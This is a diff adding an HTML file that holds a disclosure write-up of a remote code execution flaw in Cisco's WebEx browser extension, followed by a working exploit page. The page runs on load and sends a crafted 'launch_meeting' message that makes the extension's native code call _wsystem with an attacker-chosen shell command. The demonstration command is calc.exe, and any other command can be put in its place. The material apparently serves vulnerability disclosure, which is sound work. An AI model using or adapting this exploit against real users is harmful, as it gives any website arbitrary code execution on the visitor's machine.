@@ -1,0 +1,155 @@
+<!--
+Cisco's WebEx extension (jlhmfgmfgeifomenelglieieghnjghma) has ~20M active users, and is part of Cisco's popular web conferencing software.
+
+The extension works on any URL that contains the magic pattern "cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html", which can be extracted from the extensions manifest. Note that the pattern can occur in an iframe, so there is not necessarily any user-visible indication of what is happening, visiting any website would be enough.
+
+The extension uses nativeMessaging, so this magic string is enough for any website to execute arbitrary code (!!).
+
+The protocol the extension uses is complicated, using CustomEvent() objects to pass JSON messages between the webpage, the extension and the native code.
+
+Stepping through an initialization, a website must first request that the extension open a port for communication, like this:
+
+document.dispatchEvent(new CustomEvent("connect", { detail: { token: "token" }})); // token can be any string
+
+Then messages can passed to native code via "message" events. Note that these cannot be MessageEvent() objects, and you cannot use the postMessage API, they have to be CustomEvent() objects.
+
+There are a few different message types, such as "hello", "disconnect", etc. The most interesting is "launch_meeting":
+
+    document.dispatchEvent(new CustomEvent("message", { detail: {
+            message: JSON.stringify(msg),
+            message_type: "launch_meeting",
+            timestamp: (new Date()).toUTCString(),
+            token: "token"
+        }
+    }));
+
+I stepped through a meeting and dumped the initialization messages:
+
+> message.message
+"{"DocshowVersion": "1.0",
+"FilterSecParameters": "clientparam;clientparam_value",
+"GpcProductRoot": "WebEx",
+"GpcMovingInSubdir": "Wanta",
+"GpcProductVersion": "T30_MC",
+"GpcUpgradeManagement": "false",
+"GpcCompatibleDesktopClients": "",
+"enableQuickLaunch": "1",
+"GpcProductDescription": "V2ViRXg=",
+"GpcUnpackName": "atgpcdec",
+"JMTSignificantFileList": "atgpcext.dll;atmccli.dll;comui.dll;webexmgr.dll;plugin-config.xml;atmgr.exe;ieatgpc.dll;atkbctl.dll;atwbxui15.dll;atcarmcl.dll;attp.dll;atarm.dll;wbxcrypt.dll;mmssl32.dll;libeay32.dll;ssleay32.dll;atmemmgr.dll;wcldll.dll;uilibres.dll;pfwres.dll;wbxtrace.dll;mcres.dll;atresec.dll;atrestc.dll;mfs.dll;mutilpd.dll;wseclient.dll;mticket.dll;wsertp.dll",
+"jmtclicklog": "1484862376664",
+"GpcExtName": "atgpcext",
+"GpcUnpackVersion": "27, 17, 2016, 501",
+"GpcExtVersion": "3015, 0, 2016, 1117",
+"GpcUrlRoot": "https://join-test.webex.com/client/WBXclient-T30L10NSP15EP1-10007/webex/self",
+"GpcComponentName": "YXRtY2NsaS5ETEw=",
+"GpcCompressMethod": "7z",
+"GpcActiveIniSection": "V2ViRXhfVg==",
+"GpcSupportPageUrl": "",
+"GpcIniFileName": "Z3BjLnBocD9wbW9kdWxlcz0lN0NNQ19TVEQlN0NDaGF0JTdDUG9sbGluZyU3Q05vdGUlN0NWaWRlb1NoYXJlJTdDV2ViZXhfUkElN0NBUyU3Q1BEJk9TPVZUJnJlcGxhY2VLZXk9VklTVEElN0NTU0YmTE49JmJhc2ljbmFtZT1XZWJFeF9WJk9TX0JpdD0zMg==
+...
+
+There are a huge number of properties, many are obviously good candidates for code execution, but these jumped out at me:
+
+"GpcComponentName": "YXRtY2NsaS5ETEw=",
+"GpcInitCall": "c3pDb29raWU9SW5pdENvbnRyb2woJUhXTkQpO05hbWVWYWx1ZShMb2dnaW5nVVJMX05hbWUsTG9nZ2luZ1VSTCk7TmFtZVZhbHVlKE1lZXRpbmdJRF9OYW1lLE1lZXRpbmdJRCk7TmFtZVZhbHVlKFNlc3Npb25JRF9OYW1lLFNlc3Npb25JRCk7TmFtZVZhbHVlKEdwY0luaUZpbGVOYW1lX05hbWUsR3BjSW5pRmlsZU5hbWUpO05hbWVWYWx1ZShHcGNVcmxSb290X05hbWUsR3BjVXJsUm9vdCk7TmFtZVZhbHVlKEdwY0V4dFZlcnNpb25fTmFtZSxHcGNFeHRWZXJzaW9uKTtOYW1lVmFsdWUoR3BjVW5wYWNrVmVyc2lvbl9OYW1lLEdwY1VucGFja1ZlcnNpb24pO05hbWVWYWx1ZShHcGNQcm9kdWN0Um9vdF9OYW1lLEdwY1Byb2R1Y3RSb290KTtOYW1lVmFsdWUobG9jYWxyb290c2VjdGlvbnZlcl9OYW1lLGxvY2Fscm9vdHNlY3Rpb252ZXIpO05hbWVWYWx1ZShSZWdUeXBlX05hbWUsUmVnVHlwZSk7TmFtZVZhbHVlKEdwY1Byb2dyZXNzQmFyVGl0bGVfTmFtZSxHcGNQcm9ncmVzc0JhclRpdGxlKTtOYW1lVmFsdWUoR3BjTWVzc2FnZVRpdGxlX05hbWUsR3BjTWVzc2FnZVRpdGxlKTtOYW1lVmFsdWUoZG93bmxvYWRsb2NhbHNldHRpbmdfTmFtZSxkb3dubG9hZGxvY2Fsc2V0dGluZyk7TmFtZVZhbHVlKHByb2R1Y3RuYW1lX05hbWUscHJvZHVjdG5hbWUpO05hbWVWYWx1ZShTRlN1cHBvcnRpbmdfTmFtZSxTRlN1cHBvcnRpbmdfVmFsdWUpO05hbWVWYWx1ZShNZWV0aW5nUmFuZG9tX05hbWUsTWVldGluZ1JhbmRvbSk7TmFtZVZhbHVlKGNsaWVudHBhcmFtX05hbWUsY2xpZW50cGFyYW1fVmFsdWUpO0ZpbmlzaENhbGwoc3pDb29raWUpOw==",
+
+If we decode those strings, we get:
+
+GpcComponentName: "atmccli.DLL"
+GpcInitCall: "szCookie=InitControl(%HWND);NameValue(LoggingURL_Name,LoggingURL);NameValue(MeetingID_Name,MeetingID);NameValue(SessionID_Name,SessionID);NameValue(GpcIniFileName_Name,GpcIniFileName);NameValue(GpcUrlRoot_Name,GpcUrlRoot);NameValue(GpcExtVersion_Name,GpcExtVersion);NameValue(GpcUnpackVersion_Name,GpcUnpackVersion);NameValue(GpcProductRoot_Name,GpcProductRoot);NameValue(localrootsectionver_Name,localrootsectionver);NameValue(RegType_Name,RegType);NameValue(GpcProgressBarTitle_Name,GpcProgressBarTitle);NameValue(GpcMessageTitle_Name,GpcMessageTitle);NameValue(downloadlocalsetting_Name,downloadlocalsetting);NameValue(productname_Name,productname);NameValue(SFSupporting_Name,SFSupporting_Value);NameValue(MeetingRandom_Name,MeetingRandom);NameValue(clientparam_Name,clientparam_Value);FinishCall(szCookie);"
+
+That looks like some sort of weird scripting language. The presence of `HWND` suggests this is interacting with native code, and if I dump the exports of atmccli.DLL:
+
+$ dumpbin /nologo /exports atmccli.dll
+
+Dump of file atmccli.dll
+
+    ordinal hint RVA      name
+
+          2    2 0001CC11 ExitControl
+         24    3 0001CC83 FinishCall
+          1    4 0001D2F9 InitControl <--
+         23    5 0001D556 NameValue
+...
+
+These exports look like the functions being called in that scripting language. Is it possible it's calling those exports?
+
+I noticed that they ship a copy of the CRT (Microsoft's C Runtime, containing standard routines like printf, malloc, etc), so I tried calling the standard _wsystem() routime (like system(), but for WCHAR strings), like this:
+
+var msg = {
+    GpcProductRoot: "WebEx",
+    GpcMovingInSubdir: "Wanta",
+    GpcProductVersion: "T30_MC",
+    GpcUnpackName: "atgpcdec",
+    GpcExtName: "atgpcext",
+    GpcUnpackVersion: "27, 17, 2016, 501",
+    GpcExtVersion: "3015, 0, 2016, 1117",
+    GpcUrlRoot: "http://127.0.0.1/",
+    GpcComponentName: btoa("MSVCR100.DLL"),
+    GpcSuppressInstallation: btoa("True"),
+    GpcFullPage: "True",
+    GpcInitCall: btoa("_wsystem(ExploitShellCommand);"),
+    ExploitShellCommand: btoa("calc.exe"),
+}
+
+Unbelievably, that worked.
+
+Example exploit attached.
+
+I uploaded a demo here for testing (this URL is secret)
+
+https://lock.cmpxchg8b.com/ieXohz9t/
+
+(You can make sure WebEx is installed and working first by going here. You don't need to register, just enter any name and email)
+
+https://www.webex.com/test-meeting.html
+-->
+
+<html>
+<head>
+<title>Cisco WebEx Exploit</title>
+<script>
+var msg = {
+    GpcProductRoot: "WebEx",
+    GpcMovingInSubdir: "Wanta",
+    GpcProductVersion: "T30_MC",
+    GpcUnpackName: "atgpcdec",
+    GpcExtName: "atgpcext",
+    GpcUnpackVersion: "27, 17, 2016, 501",
+    GpcExtVersion: "3015, 0, 2016, 1117",
+    GpcUrlRoot: "http://127.0.0.1/",
+    GpcComponentName: btoa("MSVCR100.DLL"),
+    GpcSuppressInstallation: btoa("True"),
+    GpcFullPage: "True",
+    GpcInitCall: btoa("_wsystem(ExploitShellCommand);"),
+    ExploitShellCommand: btoa("calc.exe"),
+}
+
+function runcode()
+{
+    if (!document.location.pathname.endsWith("cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html")) {
+        alert("document /must/ be named cwcsf-nativemsg-iframe-43c85c0d-d633-af5e-c056-32dc7efc570b.html");
+        return;
+    }
+
+    if (!document.location.protocol.endsWith("https:")) {
+        alert("document /must/ be served over https");
+        return;
+    }
+
+    document.dispatchEvent(new CustomEvent("connect", { detail: { token: "token" }}));
+    document.dispatchEvent(new CustomEvent("message", { detail: {
+            message: JSON.stringify(msg),
+            message_type: "launch_meeting",
+            timestamp: (new Date()).toUTCString(),
+            token: "token"
+        }
+    }));
+}
+</script>
+</head>
+<body onload="runcode()">
+<h1>Running exploit...</h1>
+</body>
+</html>
